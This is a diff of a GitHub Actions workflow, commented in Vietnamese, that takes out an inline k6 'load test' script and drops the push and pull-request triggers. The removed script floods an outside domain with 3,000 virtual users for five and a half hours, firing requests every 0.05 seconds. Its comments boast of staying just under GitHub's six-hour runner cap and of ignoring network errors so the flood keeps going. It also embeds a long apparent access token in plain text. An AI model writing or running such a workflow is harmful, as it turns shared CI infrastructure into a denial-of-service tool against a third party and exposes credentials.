@@ -1,11 +1,7 @@
 name: K6 Peak Load Testing
 
 on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-  workflow_dispatch: # Cho phép bạn bấm nút "Run workflow" để chạy bằng tay bất kỳ lúc nào
+  workflow_dispatch: # Kích hoạt bằng tay từ giao diện Web GitHub
 
 jobs:
   k6_load_test:
@@ -23,40 +19,5 @@ jobs:
         sudo apt-get update
         sudo apt-get install k6
 
-    - name: Create Load Test Script
-      run: |
-        cat << 'EOF' > load_test_immortal.js
-        import http from 'k6/http';
-        import { check, sleep } from 'k6';
-
-        export const options = {
-          scenarios: {
-            github_peak_flood: {
-              executor: 'constant-vus',
-              vus: 3000,                // Ép cứng 3000 người dùng ảo từ máy chủ GitHub
-              duration: '5h30m',        // Chạy liên tục 5 tiếng 30 phút (Gần chạm trần 6 tiếng của GitHub)
-            },
-          },
-        };
-
-        const TOKEN = '05%2F7JlwSPGyw9zyLckWuhme1c4JqGT6pX1uSy1Ld66Ks0lsEnAmzaCPfHRaGMMhBj60RAomzqNVXQVdkJ%2FvGpaVowpSvKddd%2BBH0saRmaSfpII9yKGTouYzJkIX3r5OeMYWNimHnDfCophfzoCZZd634dab%2FvlFiVoMR3hDON8eKj8IAj3saw11dQOTZtiWa2pIyfnvizdXa3ZMpzjvZQZ4MZdYtJ5Kv%2FTR62yUfVNfAKuz6sPgOP7c6YndWVNK1nBOWGeV3QeGFde7BYqF4jjKnXMM%2BTde79%2FcNnVPSVQyOthFft6QiJOs75gGveb8oVN23gAVXLf%2B8WMun5ZmkQQ%3D%3D.79d5031f8b5c0a7602fef3a2fb61859e40f8aa46a81495dcfa50f8ebe04e280b';
-
-        export default function () {
-          try {
-            const res1 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
-            check(res1, { 'API Status Checked': (r) => r.status === 200 || r.status === 401 });
-
-            const res2 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
-            check(res2, { 'New Hub Pinged': (r) => r.status !== 0 });
-
-            const res3 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
-            check(res3, { 'Old Hub Pinged': (r) => r.status !== 0 });
-          } catch (err) {
-            // Bypass lỗi mạng để giữ luồng bắn liên tục
-          }
-          sleep(0.05); // Tần suất dồn dập kịch trần
-        }
-        EOF
-
     - name: Run k6 Performance Test
-      run: k6 run load_test_immortal.js
+      run: k6 run script.js
